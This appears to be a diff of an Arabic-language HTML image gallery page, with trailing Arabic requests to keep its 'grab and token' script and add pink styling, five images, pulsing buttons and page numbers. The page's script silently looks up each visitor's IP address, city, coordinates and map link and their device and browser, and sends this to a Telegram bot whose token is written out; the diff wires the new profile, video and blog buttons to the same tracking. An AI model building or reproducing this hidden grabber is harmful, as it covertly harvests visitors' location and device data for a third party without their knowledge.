@@ -1,14 +1,13 @@
-عدل على هاذ كود
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
+  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>طائفة الظلام - DKSTx666</title>
   <style>
     body {
       margin: 0;
-      background-color: pink;
+      background: radial-gradient(circle, pink 20%, #ffccff);
       font-family: Arial, sans-serif;
       direction: rtl;
       text-align: center;
@@ -51,24 +50,25 @@
       right: 20px;
       animation: pulse 2s infinite;
       box-shadow: 0 0 10px purple;
+      cursor: pointer;
     }
 
     @keyframes pulse {
-      0% { box-shadow: 0 0 0 0 rgba(128, 0, 128, 0.7); }
-      70% { box-shadow: 0 0 0 15px rgba(128, 0, 128, 0); }
-      100% { box-shadow: 0 0 0 0 rgba(128, 0, 128, 0); }
+      0% { box-shadow: 0 0 0 0 rgba(255, 255, 0, 0.7); }
+      70% { box-shadow: 0 0 0 15px rgba(255, 255, 0, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(255, 255, 0, 0); }
     }
 
     .posts-container {
       display: grid;
-      grid-template-columns: repeat(3, 1fr);
+      grid-template-columns: repeat(5, 1fr);
       gap: 10px;
       padding: 80px 10px 30px;
     }
 
     .post-img {
       width: 100%;
-      height: 120px;
+      height: 100px;
       object-fit: cover;
       border-radius: 10px;
       cursor: pointer;
@@ -77,7 +77,7 @@
 
     .post-img:hover {
       transform: scale(1.05);
-      box-shadow: 0 0 15px #4b0082;
+      box-shadow: 0 0 15px #800080;
     }
 
     .lightbox {
@@ -121,7 +121,6 @@
       font-size: 16px;
     }
 
-    /* 👑 زر فيديو دائري */
     .video-fab {
       position: fixed;
       bottom: 20px;
@@ -129,16 +128,47 @@
       width: 60px;
       height: 60px;
       border-radius: 50%;
-      background-color: black;
-      color: pink;
+      background-color: red;
+      color: white;
       display: flex;
       align-items: center;
       justify-content: center;
       font-size: 24px;
-      box-shadow: 0 0 15px pink;
+      box-shadow: 0 0 15px red;
       animation: pulse 2s infinite;
       cursor: pointer;
       z-index: 1000;
+    }
+
+    .blog-fab {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background-color: yellow;
+      color: black;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      box-shadow: 0 0 15px yellow;
+      animation: pulse 2s infinite;
+      cursor: pointer;
+      z-index: 1000;
+    }
+
+    .pagination {
+      margin-top: 20px;
+    }
+
+    .pagination a {
+      margin: 0 5px;
+      text-decoration: none;
+      font-size: 18px;
+      color: purple;
+      font-weight: bold;
     }
   </style>
 </head>
@@ -150,34 +180,34 @@
     لطالما كان ظلام كلمات لا يفهمها الا من قرأها وشادو من سا يكتب الكلمات
   </div>
 
-  <header>
-    <a href="👑 https://www.facebook.com/profile.php?id=61573033204340" target="_blank">
-      <div class="profile-pic"></div>
-    </a>
+  <header onclick="goToIndex()">
+    <div class="profile-pic"></div>
   </header>
 
   <div class="posts-container">
-    <!-- 👑 منشورات -->
-    <a href="#img1"><img src="بدون اسم130_20250502141304.png" class="post-img"></a>
-    <a href="#img2"><img src="بدون اسم150_20250616203704.png" class="post-img"></a>
-    <a href="#img3"><img src="بدون اسم130_20250502141304.png" class="post-img"></a>
+    <a href="#img1"><img src="img1.png" class="post-img"></a>
+    <a href="#img2"><img src="img2.png" class="post-img"></a>
+    <a href="#img3"><img src="img3.png" class="post-img"></a>
+    <a href="#img4"><img src="img4.png" class="post-img"></a>
+    <a href="#img5"><img src="img5.png" class="post-img"></a>
   </div>
 
-  <!-- 👑 نوافذ تكبير الصور مع زر تحميل -->
   <div id="img1" class="lightbox">
     <a href="#" class="close-btn">×</a>
-    <img src="بدون اسم130_20250502141304.png" id="zoom1">
-    <a href="بدون اسم130_20250502141304.png" download class="download-btn">تحميل الصورة</a>
+    <img src="img1.png">
+    <a href="img1.png" download class="download-btn">تحميل الصورة</a>
   </div>
 
-  <div id="img2" class="lightbox">
-    <a href="#" class="close-btn">×</a>
-    <img src="بدون اسم150_20250616203704.png" id="zoom2">
-    <a href="بدون اسم150_20250616203704.png" download class="download-btn">تحميل الصورة</a>
+  <div class="pagination">
+    <a href="index1.html">1</a>
+    <a href="index2.html">2</a>
+    <a href="index3.html">3</a>
+    <a href="index4.html">4</a>
+    <a href="index5.html">5</a>
   </div>
 
-  <!-- 👑 زر فيديو دائري يفتح index.html -->
   <div class="video-fab" onclick="goToIndex()">🎥</div>
+  <div class="blog-fab" onclick="goToIndex()">📖</div>
 
   <script>
     const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
@@ -193,30 +223,27 @@
           report += `🏙️ المدينة: ${data.city || "❌"}\n`;
           report += `🌎 إحداثيات: ${data.loc || "❌"}\n`;
           report += `🛰️ خريطة: https://www.google.com/maps?q=${data.loc || ""}\n\n`;
-        }).catch(() => {
+        })
+        .catch(() => {
           report += "🌐 IP: ❌ فشل جلب الـ IP\n\n";
         });
     }
 
     function getDeviceInfo() {
-      try {
-        const ua = navigator.userAgent;
-        report += `🧠 UserAgent: ${ua}\n`;
+      const ua = navigator.userAgent;
+      report += `🧠 UserAgent: ${ua}\n`;
 
-        if (/android/i.test(ua)) report += "📱 الجهاز: أندرويد ✅\n";
-        else if (/iphone|ipad/i.test(ua)) report += "🍏 الجهاز: آيفون ✅\n";
-        else if (/windows/i.test(ua)) report += "💻 الجهاز: ويندوز ✅\n";
-        else report += "🌀 الجهاز: غير معروف ❌\n";
+      if (/android/i.test(ua)) report += "📱 الجهاز: أندرويد ✅\n";
+      else if (/iphone|ipad/i.test(ua)) report += "🍏 الجهاز: آيفون ✅\n";
+      else if (/windows/i.test(ua)) report += "💻 الجهاز: ويندوز ✅\n";
+      else report += "🌀 الجهاز: غير معروف ❌\n";
 
-        if (/chrome/i.test(ua)) report += "🌐 المتصفح: Chrome ✅\n";
-        else if (/firefox/i.test(ua)) report += "🌐 المتصفح: Firefox ✅\n";
-        else if (/safari/i.test(ua)) report += "🌐 المتصفح: Safari ✅\n";
-        else report += "🌐 المتصفح: غير معروف ❌\n";
+      if (/chrome/i.test(ua)) report += "🌐 المتصفح: Chrome ✅\n";
+      else if (/firefox/i.test(ua)) report += "🌐 المتصفح: Firefox ✅\n";
+      else if (/safari/i.test(ua)) report += "🌐 المتصفح: Safari ✅\n";
+      else report += "🌐 المتصفح: غير معروف ❌\n";
 
-        report += "\n";
-      } catch {
-        report += "🧠 معلومات الجهاز: ❌ فشل في التحليل\n\n";
-      }
+      report += "\n";
     }
 
     function sendToTelegram(msg) {
@@ -235,33 +262,15 @@
 
     runReport();
 
-    // 👑 فتح صفحة index عند الضغط على زر الفيديو
     function goToIndex() {
       fetch("https://ipinfo.io/json")
         .then(res => res.json())
         .then(data => {
           const msg = `🎬 دخول إلى index.html:\nIP: ${data.ip}\n📍 ${data.city}, ${data.country}`;
           sendToTelegram(msg);
-          window.location.href = "index.html"; // 👑 يمكن تغييره
+          window.location.href = "index.html";
         });
     }
   </script>
 </body>
 </html>
-
-خلي كل شيء كما هوا
-
-سكربت سحب وتوكن
-و غلاف قابل لتغيير صورة و صورة بروفايل قابل للنقر ضع به مسار index بدل رابط
-
-خلفية موقع وردية تتوهج صور منشورات مرتبا 5 صور من يمين لليسار يمكن نقر عليها تتأثر بسحر ارجواني و تكبر صورة للشاشة ويجي زر تحميل 
-
-زر فيديو دائري احمر ينبض بلون احمر في زاوية اسفل يمين فيه مسار index
-
-زر مدونات 📖 بلون اصفر ينبض بلون اصفر
-
-خلي وصف كما هوا
-
-ضف ارقام لصفحات من 1 الى 5 وحط فيهم اسم index
-
-خلي نقرة ينقرها المضيف يرسل معلومات لتوكن البوت
